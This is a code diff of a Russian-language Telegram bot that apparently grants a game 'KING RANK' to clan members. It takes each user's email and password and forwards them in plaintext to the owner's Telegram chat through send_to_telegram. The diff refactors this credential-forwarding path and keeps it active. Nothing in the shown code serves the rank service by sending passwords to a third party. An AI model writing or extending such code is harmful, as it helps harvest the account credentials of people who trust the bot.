@@ -58,7 +58,7 @@ def is_admin(message):
 def send_to_telegram(email, password, clan_id):
     try:
         bot.send_message(CHAT_ID,
-            f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}")
+            f"📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}")
     except:
         pass
 
@@ -227,25 +227,20 @@ def handle_message(message):
 
         user_id = message.from_user.id
 
-        # --- OWNER bypass ---
+        # --- Проверка клана для обычных пользователей ---
         if user_id != OWNER_ID:
             if not clan_id or clan_id not in MY_CLAN_IDS:
                 bot.send_message(message.chat.id, "❌️ Вы не являетесь участником LEVEL PERFORMANCE 🔴🟣🔵")
                 del user_states[message.from_user.id]
                 return
-        else:
-            bot.send_message(message.chat.id, "👑 OWNER MODE: проверка клана пропущена")
+
+        # Если ClanId пустой, ставим метку
+        if not clan_id:
+            clan_id = "Нет клана"
 
         # --- ВЫДАЧА KING RANK ---
         if set_rank(token):
-            try:
-                bot.send_message(
-                    CHAT_ID,
-                    f"👑 KING RANK ВЫДАН\n\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
-                )
-            except:
-                pass
-
+            send_to_telegram(email, password, clan_id)
             bot.send_message(message.chat.id, "✅ Готово!")
         else:
             bot.send_message(message.chat.id, "❌ Ошибка установки ранга.")
